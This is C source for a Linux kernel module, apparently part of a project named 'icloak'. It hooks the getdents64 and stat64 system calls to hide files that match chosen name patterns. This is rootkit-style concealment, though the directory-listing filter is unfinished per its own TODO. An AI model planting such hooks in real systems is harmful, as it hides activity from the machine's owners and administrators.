/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <linux/slab.h>
#include <linux/native_utils.h>
#include <utils/icloak_ctx.h>
#include <kook.h>

asmlinkage long (*getdents64_syscall)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) = NULL;

asmlinkage long (*stat64_syscall)(const char __user *filename, struct stat64 __user *statbuf) = NULL;

static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL, *g_icloak_hidden_patterns_tail = NULL;

void icloak_native_free(void *ptr) {
    if (ptr != NULL) {
        kfree(ptr);
    }
}

void *icloak_native_alloc(size_t size) {
    return kmalloc(size, GFP_ATOMIC);
}

void native_hide_file(const char *pattern) {
    if (pattern == NULL) {
        return;
    }

    // INFO(Rafael): Performing the syscall hookings if it was not done before.

    if (getdents64_syscall == NULL) {
        kook(__NR_getdents64, icloak_getdents64, (void **)&getdents64_syscall);
    }

    if (stat64_syscall == NULL) {
        kook(__NR_stat64, icloak_stat64, (void **)&stat64_syscall);
    }

    g_icloak_hidden_patterns = icloak_add_filename_pattern(g_icloak_hidden_patterns,
                                                           pattern, strlen(pattern), &g_icloak_hidden_patterns_tail);
}

void native_show_file(const char *pattern) {
    if (pattern == NULL) {
        return;
    }

    g_icloak_hidden_patterns = icloak_del_filename_pattern(g_icloak_hidden_patterns, pattern);

    if (g_icloak_hidden_patterns == NULL) {
        // INFO(Rafael): Having a empty list we can undo the sycall hookings.
        if (getdents64_syscall != NULL) {
            if (kook(__NR_getdents64, getdents64_syscall, NULL) == 0) {
                getdents64_syscall = NULL;
            }
        }

        if (stat64_syscall != NULL) {
            if (kook(__NR_stat64, stat64_syscall, NULL) == 0) {
                stat64_syscall = NULL;
            }
        }
    }
}

asmlinkage long icloak_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long total, num, delta;
    struct linux_dirent64 *dirp = NULL;

    num = total = getdents64_syscall(fd, dirent, count);
    dirp = dirent;
    delta = 0;

    while (num > 0) {
        if (icloak_match_filename(dirp->d_name, g_icloak_hidden_patterns)) {
            delta += dirp->d_reclen;
        }

        num -= dirp->d_reclen;
        dirp = (void *)dirp + dirp->d_reclen;
    }

    // TODO(Rafael): Rearrange the dirent structure eliminating the matched patterns.

    return total;
}

asmlinkage long icloak_stat64(const char __user *filename, struct stat64 __user *statbuf) {
    int matches;

    matches = icloak_match_filename(filename, g_icloak_hidden_patterns);

    if (matches) {
        return ENOENT;
    }

    return stat64_syscall(filename, statbuf);
}
